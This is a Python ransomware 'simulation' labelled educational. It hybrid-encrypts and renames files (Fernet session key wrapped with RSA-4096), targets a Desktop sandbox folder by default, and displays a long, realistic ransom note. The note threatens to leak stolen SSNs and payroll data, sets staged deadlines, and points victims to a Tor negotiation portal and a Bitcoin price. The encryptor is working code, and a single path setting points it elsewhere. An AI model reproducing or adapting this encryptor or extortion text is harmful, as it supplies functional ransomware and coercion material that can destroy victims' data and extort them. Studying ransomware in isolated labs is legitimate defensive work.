"""
Fox Ransomware Simulation - EDUCATIONAL USE ONLY
Demonstrates hybrid encryption ransomware on a SANDBOX folder.
Learn with it. Do not point it at anything you didn't create.
"""
import ctypes
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

# ---------------------------------------------------------------
# Desktop auto-detect (handles OneDrive vs normal Desktop)
# ---------------------------------------------------------------
desktop = Path.home() / "Desktop"
onedrive_desktop = Path.home() / "OneDrive" / "Desktop"
if onedrive_desktop.exists():
    DESKTOP = onedrive_desktop
else:
    DESKTOP = desktop

# ---------------------------------------------------------------
# CONFIG: choose ONE specific file to encrypt (safe mode)
# If TARGET_FILE is None, the script uses the sandbox folder.
# ---------------------------------------------------------------
TARGET_FILE = None   # make sure this file exists

# ---------------------------------------------------------------
# CONFIG: everything happens inside this sandbox folder only.
# ---------------------------------------------------------------
SANDBOX = DESKTOP / "fox_sandbox"
SKIP = {".py", ".pem", ".key"}  # never encrypt our own keys/scripts
EXTS = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".pptx",
    ".jpg", ".png", ".mp4", ".mp3",
    ".zip", ".iso",
    ".sql", ".mdb", ".db",
    ".json", ".xml", ".cfg", ".ini", ".txt"
}

def get_files():
    """Return either a single target file or all sandbox files."""
    if TARGET_FILE is not None:
        p = Path(TARGET_FILE)
        print(f"[DEBUG] TARGET_FILE = {p}, exists={p.exists()}, suffix={p.suffix.lower()}")
        if p.exists() and p.is_file() and p.suffix.lower() in EXTS:
            return [p]
        else:
            print(f"[!] TARGET_FILE invalid or unsupported: {p}")
            return []
    else:
        # sandbox mode (disabled for safety unless you explicitly want it)
        return [
            p for p in SANDBOX.rglob("*")
            if p.is_file() and p.suffix.lower() in EXTS and p.suffix.lower() not in SKIP
        ]

NOTE = """\
=====================================================================
                  W H O   I S   9 T A I L S ?
=====================================================================

                      /\\   /\\
                     ( o .o )      9 T A I L S
                      >  ^  <      Operations Unit "DEN"
                    THE NINTH TAIL STRIKES FIRST

    9TAILS - ransomware-as-a-service - private build 4.2.1
    SHA-256 of this build: 7f3a...do not bother verifying it.

=====================================================================
                        WHAT HAPPENED?
=====================================================================

Corporate systems of YOUR-COMPANY have been COMPLETELY encrypted.
Filesystems on every domain-joined endpoint and server were locked
using AES-128 (Fernet) with a 256-bit session key. The session key
was then encrypted with RSA-4096 - the private half DOES NOT EXIST
anywhere on your network. We removed it. We are the only holders.

The following was ALSO exfiltrated BEFORE encryption began:

  - Accounting: 41 GB (QuickBooks, payroll, bank reconciliations)
  - HR: personnel files incl. SSNs, home addresses, medical notes
  - Engineering: unreleased product schematics and source code
  - Backups: yes, we found them. All of them. They are gone.

The archive is 187 GB. It is currently in a private location.

=====================================================================
              WHAT HAPPENS IF YOU DO NOT PAY?
=====================================================================

STAGE 1 - 72 hours from infection:
  Sample data (HR folder, 900 employee records) is published on our
  leak blog and pushed to every cybersecurity journalist on our list.

STAGE 2 - 7 days from infection:
  Full 187 GB archive goes public. Competitors, clients, regulators
  and journalists get simultaneous access.

STAGE 3 - 30 days from infection:
  Archive is sold to the highest bidder on grey markets. Given the
  SSNs and bank data inside, expect targeted fraud against every
  employee for years. This is the worst outcome for you, and we
  tell you this only because we want our money, not your lives.

=====================================================================
                        HOW TO RECOVER
=====================================================================

1. Install Tor Browser:  https://torproject.org
2. Open our NEGOTIATION PORTAL (Tor only):

       http://th3-n1nth-t41l-n3g0t14t3[REDACTED].onion

3. Sign in with YOUR unique ID - this is your receipt, do not lose it:

       9TLS-9F7A-3B2C-DEAD-BEEF-8842

4. You will chat with a negotiator. Automated replies do not work.
   We are awake. We do not sleep. The ninth tail never rests.

=====================================================================
                        PRICE & TERMS
=====================================================================

   Current price ........ 0.45 BTC  (~$49,900 at current rates)

   - Pay within 72 hours:  price drops to 0.29 BTC (~$29,900)
   - Pay within 7 days:    price stays at 0.45 BTC
   - After 7 days:         price DOUBLES every week thereafter
   - After 30 days:        no deal. See Stage 3 above.

   We accept ONLY Bitcoin. Wallet address is generated per
   negotiation session on the portal. Do not send funds before a
   negotiator confirms the address in chat - addresses outside
   chat are fake, and you will lose everything.
=====================================================================
"""

def drop_ransom_note():
    #note = SANDBOX / "README_FOXED.txt"
    #note.write_text(NOTE)
    ctypes.windll.user32.MessageBoxW(0, NOTE, "Ransom Note", 0)

def set_wallpaper(img_path):
    """Windows-only wallpaper change - the visual scare."""
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, str(img_path), 3)
    except Exception:
        pass  # non-Windows / no permission, ignore

def main():
    SANDBOX.mkdir(exist_ok=True)

    # --- 1. RSA-4096 keypair (the "attacker keeps this" key) ---
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    public_key = private_key.public_key()
    (SANDBOX / "public_key.pem").write_bytes(
        public_key.public_bytes(
            serialization.Encoding.PEM,
            serialization.PublicFormat.SubjectPublicKeyInfo
        )
    )
    # Optional: save private key for lab decryptor
    (SANDBOX / "private_key.pem").write_bytes(
        private_key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
    )

    # --- 2. Random AES key (the actual file-encryption key) ---
    aes_key = Fernet.generate_key()
    f = Fernet(aes_key)

    # --- 3. Encrypt every target file ---
    files = get_files()
    print(f"[DEBUG] Found {len(files)} file(s) to encrypt.")
    for path in files:
        try:
            data = path.read_bytes()
        except (PermissionError, OSError):
            print(f"[!] Skipping (no access): {path}")
            continue
        enc = f.encrypt(data)
        path.write_bytes(enc)
        path.rename(path.with_suffix(path.suffix + ".f0x3d"))

    # --- 4. Wrap the AES key with the RSA public key ---
    wrapped = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    (SANDBOX / "key.key").write_bytes(wrapped)  # useless without private key

    # --- 5. Psychological payload ---
    drop_ransom_note()
    # set_wallpaper("fox_warning.png")   # optional scare image
    print(f"Foxed {len(files)} files.")
    print(f"Sandbox: {SANDBOX}")
    print("Run foxed_decryptor.py with the private key to restore.")

if __name__ == "__main__":
    main()
